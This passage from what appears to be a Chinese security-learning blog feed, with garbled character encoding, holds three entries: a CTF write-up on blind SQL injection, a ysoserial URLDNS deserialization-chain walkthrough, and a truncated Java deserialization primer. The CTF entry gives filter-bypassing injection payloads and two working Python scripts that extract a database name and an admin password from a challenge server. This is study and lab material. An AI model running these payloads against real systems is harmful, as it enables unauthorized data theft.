    <content type="html"><![CDATA[<p>å‚è€ƒwpï¼š<a href="https://www.yuque.com/u21437924/ap9vtm/gqkc3dcfmfpe5p85?singleDoc#RI7de">https://www.yuque.com/u21437924/ap9vtm/gqkc3dcfmfpe5p85?singleDoc#RI7de</a></p><p><a href="https://blog.csdn.net/cai_huaer/article/details/151112526?spm=1001.2014.3001.5502">https://blog.csdn.net/cai_huaer/article/details/151112526?spm=1001.2014.3001.5502</a></p><p>è¿™2ä¸ªå†™çš„éƒ½å¾ˆå¥½ï¼Œå¾ˆæƒ­æ„§ï¼Œæ¯æ¬¡é‡åˆ°éš¾é¢˜éƒ½æ²¡æƒ³è¿‡è‡ªå·±å»ç¢ç£¨ï¼Œè€Œæ˜¯åœ¨å¸¸è§„æ‰‹æ®µå‡ºä¸æ¥åå°±å»çœ‹wp</p><h1 id="çˆ†ç ´æ•°æ®åº“å"><a href="#çˆ†ç ´æ•°æ®åº“å" class="headerlink" title="çˆ†ç ´æ•°æ®åº“å"></a>çˆ†ç ´æ•°æ®åº“å</h1><p>æ ¹æ®csdné‚£ä¸ªwpï¼Œä»–çš„å¸ƒå°”ç›²ä½æ€è·¯å¾ˆæ–°å¥‡ï¼Œéå¸¸å€¼å¾—å­¦ä¹ </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">username=aaa&#x27;-(ascii(substr(database()from(1)))-98)-&#x27;&amp;password=admin<br></code></pre></td></tr></table></figure><p>å¤§æ„å°±æ˜¯sqlä¼šæŠŠå­—ç¬¦éšå¼è½¬æ¢ä¸ºæ•°å­—ç„¶åå»åšåŠ å‡<code>username=a&#39;-0-&#39;</code>ï¼Œåœ¨æ•°æ®åº“ä¸­å°±æ˜¯<code>select username from xxx where username=&#39;a&#39;-0-&#39;&#39;</code>ï¼Œâ€™aâ€™ä¼šå˜ä¸º0-0=0ï¼Œåé¢çš„â€™â€™ä¹Ÿçœ‹ä¸º0ï¼Œå¾—åˆ°çš„ç»“æœä¸º0ï¼Œä¼šåŒ¹é…ä»»ä½•ä»¥æ•°å­—0å¼€å¤´çš„ç”¨æˆ·åï¼Œå¦‚æœä¸­é—´æ¢æˆ1ï¼Œç»“æœå°±æ˜¯-1ï¼ŒåŒ¹é…ä¸åˆ°æ•°æ®ã€‚ç„¶åæ ¹æ®è¿™ä¸€ç‚¹æ¥å†™è„šæœ¬çˆ†ç ´ã€‚å› ä¸ºè¿™ä¸ªé¢˜ç›®è¿‡æ»¤äº†å¾ˆå¤šå­—ç¬¦ï¼Œæ‰€ä»¥è„šæœ¬è¦ç¨å¾®æ³¨æ„ä¸€ç‚¹ã€‚</p><p>è¯¥è„šæœ¬äº§è‡ªGemini3</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs shell">import requests<br>import string<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">é…ç½®ç›®æ ‡ URL</span><br>url = &quot;http://171.80.2.169:11490/index.php&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">é¢˜ç›®è¦æ±‚çš„ HTTP å¤´</span><br>headers = &#123;<br>    &quot;Host&quot;: &quot;171.80.2.169:11490&quot;,<br>    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,<br>    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36&quot;,<br>    &quot;Origin&quot;: &quot;http://171.80.2.169:11490&quot;,<br>    &quot;Referer&quot;: &quot;http://171.80.2.169:11490/&quot;<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">å­—å…¸</span><br>chars = string.ascii_lowercase + string.digits + &quot;_-@.&quot;<br><br>print(&quot;[-] å¼€å§‹çˆ†ç ´æ•°æ®åº“å (é•¿åº¦: 8)...&quot;)<br>print(&quot;[-] ç»•è¿‡ç­–ç•¥: æ— ç©ºæ ¼(ç”¨æ‹¬å·)ï¼Œæ— é€—å·(ç”¨FROM)ï¼Œæ— FOR(åˆ©ç”¨ASCIIç‰¹æ€§)&quot;)<br><br>db_name = &quot;&quot;<br><br>for i in range(1, 9):<br>    found_char = False<br>    for char in chars:<br>        char_ascii = ord(char)<br>        <br>        # æ ¸å¿ƒ Payload:<br>        # 1. ç”¨ FROM(i) ä»£æ›¿ FROM i (ç»•è¿‡ç©ºæ ¼)<br>        # 2. å»æ‰ FOR 1 (åˆ©ç”¨ ASCII åªå–é¦–å­—ç¬¦ç‰¹æ€§ï¼Œç»•è¿‡ FOR)<br>        # 3. æ•´ä½“æ— ç©ºæ ¼ï¼Œæ— é€—å·<br>        <br>        # æ„é€  SQL ç‰‡æ®µ: ascii(substr(database()from(i)))-char_ascii<br>        injection = f&quot;ascii(substr(database()from(&#123;i&#125;)))-&#123;char_ascii&#125;&quot;<br>        <br>        # æ‹¼å‡‘ POST body<br>        data_payload = f&quot;username=aaa&#x27;-(&#123;injection&#125;)-&#x27;&amp;password=admin&quot;<br>        <br>        try:<br>            # data å‚æ•°ä¼ å­—ç¬¦ä¸²ï¼Œé¿å… requests è‡ªåŠ¨å¤„ç†é€ æˆå¹²æ‰°<br>            res = requests.post(url, headers=headers, data=data_payload, timeout=5)<br>            <br>            # è¿™é‡Œçš„åˆ¤æ–­é€»è¾‘æ˜¯ï¼š<br>            # å¦‚æœçŒœå¯¹äº† -&gt; injection ç»“æœä¸º 0 -&gt; username=aaa&#x27;-0-&#x27; -&gt; çœŸ -&gt; passwd error<br>            # å¦‚æœçŒœé”™äº† -&gt; injection ç»“æœä¸º é0 -&gt; username=aaa&#x27;-é0-&#x27; -&gt; å‡ -&gt; username dont exist<br>            if &quot;password error&quot; in res.text:<br>                db_name += char<br>                print(f&quot;[+] Found char &#123;i&#125;: &#123;char&#125; -&gt; Current DB: &#123;db_name&#125;&quot;)<br>                found_char = True<br>                break<br>                <br>        except Exception as e:<br>            print(f&quot;[!] Error: &#123;e&#125;&quot;)<br><br>    if not found_char:<br>        print(f&quot;[!] ç¬¬ &#123;i&#125; ä½å­—ç¬¦æœªæ‰¾åˆ°ï¼Œå¯èƒ½ä½¿ç”¨äº†ç‰¹æ®Šå­—ç¬¦æˆ– Payload è¢«æ‹¦æˆªã€‚&quot;)<br>        db_name += &quot;?&quot;<br><br>print(f&quot;\n[success] æœ€ç»ˆæ•°æ®åº“å: &#123;db_name&#125;&quot;)<br></code></pre></td></tr></table></figure><p> ç„¶åçˆ†ç ´è¡¨å’Œåˆ—åéƒ½åªèƒ½ç”¨å­—å…¸å»çˆ†ç ´äº†ï¼š</p><p>è¯­å¥æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">çˆ†ç ´è¡¨å</span><br>username=aaa&#x27;or(select(1)from(blindsql.flag))#&amp;password=admin<br><span class="hljs-meta prompt_">#</span><span class="language-bash">çˆ†ç ´åˆ—å</span><br>username=aaa&#x27;or(select(password)from(admin))#&amp;password=admin<br></code></pre></td></tr></table></figure><h1 id="çˆ†ç ´æ•°æ®"><a href="#çˆ†ç ´æ•°æ®" class="headerlink" title="çˆ†ç ´æ•°æ®"></a>çˆ†ç ´æ•°æ®</h1><p>ä¸€å¼€å§‹ç›´æ¥è®©aiå†™è„šæœ¬ï¼Œä½†æ˜¯æ­»æ´»å‡ºé—®é¢˜ï¼Œåé¢ç»™ä»–å‚è€ƒäº†åˆ«äººçš„æ‰å†™å‡ºæ¥ã€‚åŸç†è¿˜æ˜¯<code>username=a&#39;orçœŸ</code>è¿”å›password errorï¼Œè‹¥oråé¢çš„æ¡ä»¶ä¸ºfalseï¼Œå°±è¿”å›dont exist</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs shell">import requests<br>import string<br>import sys<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">--- é…ç½®åŒºåŸŸ ---</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">ä½¿ç”¨ä½ ä¹‹å‰é¢˜ç›®ç»™å‡ºçš„ URL</span><br>url = &quot;http://171.80.2.169:15666/index.php&quot;<br>headers = &#123;<br>    &quot;Host&quot; : &quot;171.80.2.169:15666&quot; ,<br>    &quot;Content-Type&quot; : &quot;application/x-www-form-urlencoded&quot; ,<br>    &quot;User-Agent&quot; : &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36&quot; ,<br>&#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">ç›®æ ‡</span><br>table_name = &quot;admin&quot;<br>column_name = &quot;password&quot;<br><br>print( f&quot;[-] å¼€å§‹åˆ©ç”¨çº¿æ€§æ‰«æ (Linear Scan) è¯»å– &#123;table_name&#125;.&#123;column_name&#125; ...&quot; )<br>print( &quot;[-] é€»è¾‘: ddd&#x27; OR (ascii &gt; j) #&quot; )<br>print( &quot;[-] é‡åˆ° &#x27;username dont exist&#x27; è¯´æ˜æ¡ä»¶åœæ­¢æˆç«‹ï¼Œé”å®šå­—ç¬¦ã€‚&quot; )<br><br>final_data = &quot;&quot;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">å‡è®¾å¯†ç é•¿åº¦ 1 åˆ° 40</span><br>for i in range( 1 , 41 ) :<br>    found_char = False<br><br>    # éå†å¯è§å­—ç¬¦ ASCII ç  (32 - 127)<br>    # ç±»ä¼¼äºåˆ«äººçš„ range(32, 128)<br>    for j in range( 32 , 128 ) :<br><br>        # æ„é€ ä½ çš„ Payload<br>        # ddd&#x27;or(ASCII(MID((SELECT(password)FROM(admin))FROM(&#123;i&#125;))))&gt;&#123;j&#125;#<br><br>        # æ³¨æ„ï¼šè¿™é‡Œ %23 æ˜¯ # çš„ URLç¼–ç ã€‚request data å­—å…¸æœ‰æ—¶ä¼šè‡ªåŠ¨ç¼–ç ï¼Œæœ‰æ—¶ä¸ä¼šï¼Œ<br>        # ä¸ºäº†ç¨³å¦¥ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨å­—ç¬¦ä¸²é‡Œå†™ #ï¼Œå› ä¸º requests ä¼šå¸®æˆ‘ä»¬è½¬ä¹‰ body<br>        payload_str = f&quot;ddd&#x27;or(ascii(mid((select(&#123;column_name&#125;)from(&#123;table_name&#125;))from(&#123;i&#125;)))&gt;&#123;j&#125;)#&quot;<br><br>        data_payload = &#123;<br>            &quot;username&quot; : payload_str ,<br>            &quot;password&quot; : &quot;admin&quot;<br>        &#125;<br><br>        try :<br>            # å‘é€è¯·æ±‚<br>            res = requests.post( url , headers=headers , data=data_payload , timeout=3 )<br><br>            # --- æ ¸å¿ƒåˆ¤æ–­é€»è¾‘ (å’Œåˆ«äººçš„è„šæœ¬ä¸€è‡´) ---<br><br>            # æƒ…å†µ 1: çŒœå¯¹äº†å—ï¼Ÿ(Payload &gt; j ä¸ºçœŸ)<br>            # å¦‚æœ ddd&#x27; OR True -&gt; ç™»å½•æˆåŠŸ -&gt; passwd error<br>            # è¿™æ„å‘³ç€å½“å‰å­—ç¬¦ ASCII ç æ¯” j å¤§ï¼Œè¿˜éœ€è¦ç»§ç»­å¾€åæ‰¾<br>            if &quot;password error&quot; in res.text :<br>                continue  # ç»§ç»­å†…å±‚å¾ªç¯ï¼Œj åŠ  1<br><br>            # æƒ…å†µ 2: çŒœè¿‡å¤´äº†å—ï¼Ÿ(Payload &gt; j ä¸ºå‡)<br>            # å¦‚æœ ddd&#x27; OR False -&gt; ç”¨æˆ·ä¸å­˜åœ¨ -&gt; username dont exist<br>            # è¿™æ„å‘³ç€å½“å‰å­—ç¬¦ ASCII ç  ä¸å¤§äº j (å³ç­‰äº j)ï¼Œå› ä¸ºåˆšæ‰ j-1 çš„æ—¶å€™è¿˜æ˜¯ True<br>            elif &quot;username does not exist!&quot; in res.text :<br>                char = chr( j )<br>                final_data += char<br>                print( f&quot;[+] ç¬¬ &#123;i&#125; ä½: &#123;char&#125; (ascii: &#123;j&#125;) | å½“å‰: &#123;final_data&#125;&quot; )<br>                found_char = True<br>                break  # æ‰¾åˆ°äº†ï¼Œè·³å‡ºå†…å±‚ j å¾ªç¯ï¼Œå»è¯»ä¸‹ä¸€ä½ i<br><br>            # å…¶ä»–æƒ…å†µï¼ˆå¦‚æŠ¥é”™ï¼‰<br>            else :<br>                pass<br><br>        except Exception as e :<br>            print( f&quot;[!] Error: &#123;e&#125;&quot; )<br>            break<br><br>    # å¦‚æœéå†å®Œ 32-127 è¿˜æ²¡æ‰¾åˆ°ï¼Œè¯´æ˜è¿™ä¸€ä½å¯èƒ½æ²¡æœ‰å­—ç¬¦äº†ï¼ˆç»“æŸäº†ï¼‰<br>    if not found_char :<br>        print( &quot;\n[*] æ‰«æç»“æŸã€‚&quot; )<br>        break<br><br>print( f&quot;\n[Success] æœ€ç»ˆå¯†ç : &#123;final_data&#125;&quot; )<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaå®‰å…¨å­¦ä¹ ç¬”è®°4-URLDNSé“¾å­¦ä¹ </title>
    <link href="/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
    <url>/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04-URLDNS%E9%93%BE%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="è°ƒè¯•å‡†å¤‡"><a href="#è°ƒè¯•å‡†å¤‡" class="headerlink" title="è°ƒè¯•å‡†å¤‡"></a>è°ƒè¯•å‡†å¤‡</h1><p>é¦–å…ˆæˆ‘ä»¬è¦æ˜ç¡®æˆ‘ä»¬è°ƒè¯•çš„æ˜¯ysoserialï¼Œå…ˆä»GitHubä¸ŠæŠŠysoserialä¸‹è½½ä¸‹æ¥<a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a>ï¼Œç„¶åç”¨ideaæ‰“å¼€ï¼Œè¿™æ—¶ä¼šè‡ªåŠ¨ä¸‹è½½ä¾èµ–é¡¹è¿™äº›ï¼Œè‹¥æœ‰é—®é¢˜ï¼Œè‡ªè¡Œç½‘ä¸Šæœç´¢è§£å†³æ–¹æ¡ˆã€‚</p><p>ç„¶åæ‰¾åˆ°è‡ªå·±æƒ³è¦è°ƒè¯•çš„é‚£æ¡é“¾çš„å¯¹åº”payloadæ–‡ä»¶ï¼Œæ¯”å¦‚æˆ‘æƒ³è°ƒè¯•URLDNSè¿™æ¡é“¾ï¼šsrc/main/java/ysoserial/payloads/URLDNS.java</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769057378667-0afbdef7-7763-4837-914d-2b227827f869.png"></p><p>æ‰¾åˆ°mainå‡½æ•°å·¦è¾¹çš„è¿è¡ŒæŒ‰é’®ï¼Œåˆ‡æ¢æˆè°ƒè¯•ï¼Œé€šå¸¸è¿™æ—¶ä¼šæŠ¥é”™ï¼š</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769057455164-3130768f-ac08-417c-a976-25438cd727f7.png"></p><p>è¿™æ—¶å› ä¸ºé»˜è®¤å‚æ•°ä¸ºcalc.exeï¼Œè€ŒURLDNSé“¾æ˜¯è¦ä¸€ä¸ªurlåœ°å€ï¼Œåœ¨è¿è¡Œé…ç½®å¤„ä¿®æ”¹å‚æ•°ï¼Œæˆ‘è¿™ç›´æ¥ç”¨çš„yakitçš„dnslogæœåŠ¡å™¨ï¼Œè®°å¾—è¦åŠ http://</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769058494357-bc412570-53c4-4ff2-bec7-8be57ef9d165.png"></p><p>ç„¶åå°±å¯ä»¥æ„‰å¿«æ‰“æ–­ç‚¹è°ƒè¯•äº†</p><h1 id="è°ƒç”¨å‡½æ•°"><a href="#è°ƒç”¨å‡½æ•°" class="headerlink" title="è°ƒç”¨å‡½æ•°"></a>è°ƒç”¨å‡½æ•°</h1><p>å…ˆçœ‹URLDNSç±»ä¸­çš„getobjectï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›äº†ä¸€ä¸ªhashmapå¯¹è±¡</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769058840900-b54683b6-d80b-45cd-a8d5-bbbf4445b63b.png"></p><p>æˆ‘ä»¬çŸ¥é“ååºåˆ—åŒ–è§¦å‘æ˜¯åœ¨readobjectæ–¹æ³•ä¸­ï¼Œåœ¨readobjectæ–¹æ³•ä¸­æ‰¾åˆ°putvalæ–¹æ³•ï¼Œæ‰“ä¸Šæ–­ç‚¹ï¼Œå› ä¸ºåœ¨getobjectçš„æ³¨é‡Šé‡Œï¼ˆURLDNS.javaæ–‡ä»¶ç¬¬59è¡Œï¼‰å†™äº†æ˜¯åœ¨è®¡ç®—hashçš„è¿‡ç¨‹ä¸­è§¦å‘äº†dnslog</p><p><font style="color:#bcbec4;background-color:#1e1f22;">During the put above, the URLâ€™s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</font></p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769058961524-87276db7-80fb-4de4-b1d1-7e7f21a029ff.png"></p><p>å¼€å§‹è°ƒè¯•ï¼Œè¿™æ—¶ç¨‹åºä¼šå¡åœ¨putvalå¤„</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769059325932-e8460304-4e8e-4123-bd56-d3986a05c3e6.png"></p><p>æˆ‘ä»¬é€‰æ‹©æ­¥å…¥ï¼Œé€‰æ‹©hashå‡½æ•°ï¼Œç„¶åç»§ç»­æ­¥å…¥hashcodeå‡½æ•°</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769059373434-800997c3-3403-4955-a869-194198225416.png"></p><p>ç„¶åçœ‹åˆ°hashcodeé‡Œæœ‰ä¸€ä¸ªgethostaddressæ–¹æ³•</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769060516035-d977678e-e1a7-4099-8337-0d6013d6db77.png"></p><p>ç»§ç»­æ­¥å…¥ï¼Œå¯ä»¥çœ‹åˆ°è°ƒç”¨äº†getbynameæ–¹æ³•ï¼Œè§¦å‘dnsæŸ¥è¯¢</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769060558885-72af9cb5-2fbc-4cb1-9cb6-fd0c4061c1e6.png"></p><p>åœ¨yakitä¸­çœ‹åˆ°dnsè®°å½•å¦‚ä¸‹ï¼š</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769062136448-d085ab1f-07f3-456d-b2a7-eaf27bd2c1e8.png"></p><p>åœ¨è°ƒè¯•å™¨ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°è°ƒç”¨æ ˆ</p><!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š --><p><img src="https://cdn.nlark.com/yuque/0/2026/png/57713373/1769060799629-6ac0b9de-831f-4135-9562-76733cf68520.png"></p><p>HashMap-&gt;readObject</p><p>HashMap-&gt;hash</p><p>URL-&gt;hashCode</p><p>URLStreamHandler-&gt;hashCode</p><p>URLStreamHandler-&gt;getHostAddress</p><p>InetAddress-&gt;getByName</p><p>æ„é€ payloadçš„æ—¶å€™ï¼Œåˆå§‹åŒ–ä¸€ä¸ªjava.net.URLå¯¹è±¡ï¼Œä½œä¸ºkeyæ”¾åœ¨HashMapä¸­ï¼Œç„¶åè®¾ç½®è¿™ä¸ªURLå¯¹è±¡çš„hashCodeåˆå§‹å€¼ä¸º-1ï¼Œè¿™æ ·ååºåˆ—åŒ–æ—¶ä¼šé‡æ–°è®¡ç®—hashCodeï¼Œæ‰èƒ½è§¦å‘åé¢çš„DNSè¯·æ±‚ã€‚ï¼ˆå»ºè®®çœ‹pç¥åŸpdfæ–‡æ¡£ï¼ŒåŠ å…¥æ˜Ÿçƒå¯å¾—ï¼‰</p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
      <category>javasec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>javasec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaå®‰å…¨å­¦ä¹ ç¬”è®°3--ååºåˆ—åŒ–ç¯‡1</title>
    <link href="/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/"/>
    <url>/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%871/</url>
    
    <content type="html"><![CDATA[<p>è¯¥ç¯‡ç¬”è®°ç”±Gemini3 pro previewæ¨¡å‹æ€»ç»“è€Œæ¥ã€‚</p><h2 id="RCuvz"><font style="color:rgb(26, 28, 30);">1. ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–ï¼Ÿ</font></h2><font style="color:rgb(26, 28, 30);">åœ¨ç½‘ç»œé€šä¿¡ä¸­ï¼ŒJSON å’Œ XML åªèƒ½ä¼ é€’åŸºæœ¬æ•°æ®ç±»å‹ï¼ˆå­—ç¬¦ä¸²ã€æ•´å‹ç­‰ï¼‰ã€‚å¦‚æœæƒ³ä¼ è¾“ä¸€ä¸ªå¤æ‚çš„</font>**<font style="color:rgb(26, 28, 30);">Java å¯¹è±¡</font>**<font style="color:rgb(26, 28, 30);">ï¼ˆåŒ…å«å±æ€§ã€çŠ¶æ€ç”šè‡³é€»è¾‘ï¼‰ï¼Œå°±éœ€è¦å°†å…¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶æµï¼ˆåºåˆ—åŒ–ï¼‰ï¼Œæ¥æ”¶æ–¹å†å°†å…¶è¿˜åŸä¸ºå¯¹è±¡ï¼ˆååºåˆ—åŒ–ï¼‰ã€‚</font><ul><li><strong><font style="color:rgb(26, 28, 30);">åºåˆ—åŒ– (Serialization)</font></strong><font style="color:rgb(26, 28, 30);">: å¯¹è±¡ -&gt; äºŒè¿›åˆ¶æµ (</font><font style="color:rgb(50, 48, 44);">writeObject</font><font style="color:rgb(26, 28, 30);">)</font></li><li><strong><font style="color:rgb(26, 28, 30);">ååºåˆ—åŒ– (Deserialization)</font></strong><font style="color:rgb(26, 28, 30);">: äºŒè¿›åˆ¶æµ -&gt; å¯¹è±¡ (</font><font style="color:rgb(50, 48, 44);">readObject</font><font style="color:rgb(26, 28, 30);">)</font></li></ul><hr><h2 id="o1Ky5"><font style="color:rgb(26, 28, 30);">2. è·¨è¯­è¨€ååºåˆ—åŒ–å¯¹æ¯” (æ ¸å¿ƒç†è®º)</font></h2><font style="color:rgb(26, 28, 30);">ç†è§£ä¸åŒè¯­è¨€çš„ååºåˆ—åŒ–å·®å¼‚ï¼Œæ˜¯ç†è§£ Java æ¼æ´æˆå› çš„å…³é”®ã€‚</font><table><thead><tr><th><strong><font style="color:rgb(26, 28, 30);">è¯­è¨€</font></strong></th><th><strong><font style="color:rgb(26, 28, 30);">æœºåˆ¶</font></strong></th><th><strong><font style="color:rgb(26, 28, 30);">æ ¸å¿ƒç‰¹ç‚¹</font></strong></th><th><strong><font style="color:rgb(26, 28, 30);">æ¼æ´æˆå› </font></strong></th></tr></thead><tbody><tr><td><strong><font style="color:rgb(26, 28, 30);">Python</font></strong><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">(Pickle)</font></td><td><strong><font style="color:rgb(26, 28, 30);">åŸºäºæ ˆçš„è™šæ‹Ÿæœº</font></strong></td><td><font style="color:rgb(26, 28, 30);">åºåˆ—åŒ–æ•°æ®é‡Œç›´æ¥åŒ…å«äº†</font><strong><font style="color:rgb(26, 28, 30);">æŒ‡ä»¤</font></strong><font style="color:rgb(26, 28, 30);">ï¼ˆOpcodeï¼‰ã€‚</font></td><td><strong><font style="color:rgb(26, 28, 30);">æœ€å±é™©</font></strong><font style="color:rgb(26, 28, 30);">ã€‚åªè¦èƒ½ä¼ æ•°æ®ï¼Œå°±èƒ½ç›´æ¥è®©è™šæ‹Ÿæœºæ‰§è¡Œä»»æ„æŒ‡ä»¤/ä»£ç ã€‚</font></td></tr><tr><td><strong><font style="color:rgb(26, 28, 30);">PHP</font></strong><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">(Unserialize)</font></td><td><strong><font style="color:rgb(26, 28, 30);">å±æ€§è¿˜åŸ</font></strong></td><td><font style="color:rgb(26, 28, 30);">ä¾§é‡äºè¿˜åŸæ•°æ®å±æ€§ã€‚ä¾èµ–</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(50, 48, 44);">__wakeup</font><font style="color:rgb(26, 28, 30);"> </font><font style="color:rgb(26, 28, 30);">(é†’æ¥) 